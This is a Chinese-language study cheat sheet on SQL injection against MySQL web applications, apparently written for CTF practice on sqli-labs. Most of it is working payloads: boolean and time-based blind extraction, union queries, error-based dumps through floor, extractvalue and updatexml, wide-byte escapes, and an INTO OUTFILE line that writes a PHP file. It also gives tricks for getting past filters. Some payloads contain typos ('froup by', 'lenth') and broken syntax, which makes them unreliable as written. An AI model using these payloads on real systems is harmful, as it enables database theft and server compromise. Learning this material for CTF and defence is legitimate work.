## 5. SQL注入
#sql #SQL注入

联合注入 => 报错注入 => bool盲注 => 时间盲注 => 二次注入
### 5.0 判断注入类型

- 整形（没有单双引号）
- 字符串（有单双引号）

### 5.1 布尔注入
==一般配套使用一些判断真假的语句来使用，and 1=1或者and 1=2，有的网页会过滤掉1=1，可以用1253=1253等其他payload替代==
```sql
select * from accounts where username = '' or true -- ' and password = ''
select mid("123456",1,3) -- 从第一个字节开始取到第三个字节包含1，3
select ORD() -- 转换成ASCII码
select lenth() -- 统计字节长度
select version() -- 查看数据库版本
select database() -- 查看数据库名
select user() -- 查看当前用户
select a from b where left(a,1) = 'a' -- 探测第一位，假设返回字符串是"admin"，则结果为真
select a from b where left(a,2) = "ad" -- 探测第二位是要把第一位带上
ascii() -- 通常与substr结合
hex() -- ascii函数被禁止或者需要把二进制数据写入文件时可以使用
if() -- if(condition,true result,false result)举例如下
?id=1 and 1=if(ascii(substr(user(),1,1))=97,1,2)
```
==使用sqlmap可能会误报，一些数据返回页面及接口返回数据时可能会存在返回的是随机字符串（如，时间戳或防止CSRF的token等）会导致页面长度发生变化==
- 获取数据库长度

  ​	username=111’ or length(database())=8 # &password=222&act=tijiao

- 获取数据库名

  ​	ORD(mid(database(),1,1)) = ==x== 用数字夹逼范围 从第一个取，取一个

- 获取表的总数

  ​	select count(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database();

- 获取表名长度(逐个)

  ​	select lenth(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA = database() limit 0,1= ==x==

- 获取表名

  ​	select ORD(mid((TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA = database() limit 0,1),1,1)= ==x==

- 获取字段总数

  ​	select count(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME=x

- 获取字段名

  ​	select ORD(mid((COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME limit 0,1),1,1)=x

- 获取内容长度和内容

  ​	select concat(username,”----------”,password) from accounts;

### 5.2 联合注入

- 获取字段的总数
  - order by 1 依第一列排序 直到无结果为止 可知该表中有多少列
  - group by
  - 进行联合查询
- 获取数据库
  - database() 查询当前数据库名
  - user() 查询当前用户
  - version() 查询当前数据库版本
- 获取该数据库中的表
  - select table_name from information_schema.tables where table_schema=database()
- 获取该表中的字段
  - select column_name from information_schema.columns where table_name=“table_name”
  - TABLE_NAME 表名
  - TABLE_SCHEMA 库名
  - COLUMN_COMMENT 列注释
  - COLUMN_NAME 列名
  - information_schema.COLUMNS 储存了每张表中列的信息
  - information_sc 存了每张表的信息
  - information_schema.SCHEMATA 储存了所有库的信息

```sql
select <?php phpinfo(); ?> into outfile "./phpinfo.php"; -- 文件导出后执行该文件能获得phpinfo界面
select load_file(""); -- 读入文件
```

- #是html锚点url编码是%23

### 5.3 延时注入
用于报错信息被过滤的情况
```sql
sleep(second) -- 配合if使用，延迟second秒也有可能因为网络延迟更长的时间
benchmark(N,expression) -- 执行expression语句N次通常用计算哈希函数md5的方法上万次，达到延迟的效果
```
- 获取数据库总数
- 获取数据库长度
- 获取表的总数
- 获取表i的长度
- 获取表的内容
- 获取字段总数
- 获取字段长度
- 获取字段的内容

```sql
sleep(if(condition,x,y)); -- 为真返回x，为假返回y
```

### 5.4 报错注入

#### 5.4.1 BUG报错

- 别名 oldname as newname（as可以不写）
- count() rand group by 三个函数连用会报错，要求数据库中条目大于3
- select concat(floor(rand(0)*2),”====”,(select **database()**)) as **x**, count(1) from **admin** group by **x**;

#### 5.4.2 函数报错

- floor
	原理是rand和order by或group by的冲突
	```sql
	#爆破数据库版本信息
	?id=1 and(select 1 from(select count(*),concat((select (select (select concat(0x7e,version(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables froup by x)a)%23
	#爆破当前用户
	?id=1 and(select 1 from(select count(*),concat((select (select (select concat(0x7e,user(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables froup by x)a)%23
	#爆破当前使用的数据库
	?id=1 and(select 1 from(select count(*),concat((select (select (select concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables froup by x)a)%23
	#爆破指定表的字段（下面以表名为emails举例说明）
	?id=1 and(select 1 from(select count(*),concat((select (select (select distinct concat(0x7e,conlumn_name,0x7e) from information_schema.columns where table_name=0x656d616973 limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables froup by x)a)%23
	```
	这里采用十六进制编码后的表名，若像用非十六进制的则需要添加引号，但此时可能导致单引号报错。
	以上payload可在[[../target range/sqli-labs|sqli-labs]]的level1中复现
  ​	(select 1 from (select count(\*),concat(version(),floor(rand(0)\*2))x from information_schema.table group by x)a);

- extractvalue

  ​	extractvalue(1,concat(0x5c,(select table_name from information_schema.table limit 1)));

- ==updatexml==
	```sql
	1=(update(concat(0x3a,(select database())),1));
	?id=1' updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)%23
	```
	
	其他功能的payload可参照floor的使用方法来修改
- exp

  ​	exp (~(select * from (select user() a)))

- geometrycollection

  ​	geometrycollection((select * from (select * from(select user())a)b));

- polygon

  ​	polygon((select * from (select * from(select user())a)b));

- mutipoint

  ​	multipoint((select * from (select * from(select user())a)b));

- multilinestring

- multiploygon

- multinestring

- ==join==

  ​	select * from (select * from tablename a join tablename b) c

### 5.5 宽字节注入

- 设置set character_set_client = gbk时候，%df%27可以吞掉转义符%5c

### 5.6 多语句注入

- 用分号隔开所有语句末尾加%23

### 5.7 添加、修改、选择、删除型注入

==（支持报错注入，在某个参数位置使用报错注入的语句）==

- select

  ​	通过修改post内容进行注入

- update

- insert

- delete

  ​	布尔注入

  ​	延时注入

### 5.8 漏洞修补
- addslashes 字符串修补
- 转换为整形 “1”**+0**

### 5.9 常用函数
- hex()十进制转十六进制
- concat 拼接
- ascii 转化为ascii码

### 5.10 防火墙
- CDN
- 硬件防火墙
- 软件防火墙
- 程序防火墙

### 5.11 技巧
#字符过滤
空格被过滤的替代方案
/**/  
()  
回车(url编码中的%0a)  
\`(tab键上面的按钮)  
tab 
两个空格

### 5.12 二次注入
第一次入库的时候进行了一些过滤和转义，一般不会是单纯的二次注入，通常还会与报错注入或bool盲注结合出题，一般会贴出源码并告知有二次注入

### 5.13 limit之后的注入
在mysql版本号>5.0.0且<5.6.6时可以在如下位置注入
```sql
select field from table where id > 0 order by id limit {injection_point}
select field from table where id > 0 order by id limit 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);
```

### 5.14 注入点的位置及发现
#### 5.14.1 常见注入点位置
1. GET参数注入
地址栏获得URL和参数，可以用sqlmap或手工验证漏洞是否存在
2. POST中的注入
一般需要抓包实现，bp或hackbar，sqlmap或手工
3. User-Agent中的注入
bp中的repeter模块或者sqlmap设置参数level=3，会自动检测其中是否含有注入点
4. Cookie中的注入
bp中的repeter模块或者sqlmap设置参数level=2，会自动检测其中是否含有注入点
#### 5.14.2 判断注入点是否存在
1. 插入单引号
2. 数值型判断
3. 通过数字的加减进行判断